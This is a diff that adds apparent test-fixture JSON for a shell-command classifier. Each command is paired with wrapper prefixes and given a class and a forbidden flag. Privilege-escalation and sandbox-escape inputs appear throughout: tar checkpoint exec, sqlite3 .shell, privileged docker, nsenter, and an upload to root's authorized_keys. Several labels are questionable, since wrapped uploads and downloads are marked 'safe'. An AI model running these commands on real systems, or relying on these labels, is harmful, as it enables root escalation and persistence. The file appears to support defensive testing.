+  "sudo make deploy": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root make deploy": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas make deploy": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser make deploy": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv make deploy": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat tar --checkpoint-action=exec=sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sqlite3 db '.shell sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat docker run --privileged alpine sh": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat docker exec -u 0 container id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat systemd-run --uid=root id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat nsenter -t 1 -m id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo hello": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo echo hello": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root echo hello": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas echo hello": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser echo hello": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv echo hello": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat echo hello": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat echo $(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "env echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo echo '$HOME'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root echo '$HOME'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas echo '$HOME'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser echo '$HOME'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv echo '$HOME'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat echo '$HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat echo `sudo id`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sftp:download /etc/passwd": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo sftp:download /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sftp:download /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sftp:download /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sftp:download /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sftp:download /etc/passwd": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sftp:download /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sftp:upload /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo sftp:upload /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sftp:upload /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sftp:upload /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sftp:upload /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sftp:upload /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sftp:upload /root/.ssh/authorized_keys": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ls /tmp/[ab]": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo ls /tmp/[ab]": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root ls /tmp/[ab]": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas ls /tmp/[ab]": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser ls /tmp/[ab]": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv ls /tmp/[ab]": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat ls /tmp/[ab]": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "grep -r reboot /etc": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "env grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nohup grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "nice -n 5 grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ionice -c 2 grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "timeout 5 grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "flock /tmp/lk grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chroot /mnt grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "valgrind grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "command grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "exec grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "setsid grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "xargs -I {} grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sudo grep -r reboot /etc": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root grep -r reboot /etc": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas grep -r reboot /etc": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser grep -r reboot /etc": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv grep -r reboot /etc": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat grep -r reboot /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo git commit -m 'reboot the server'": {
+    "class": "privileged",
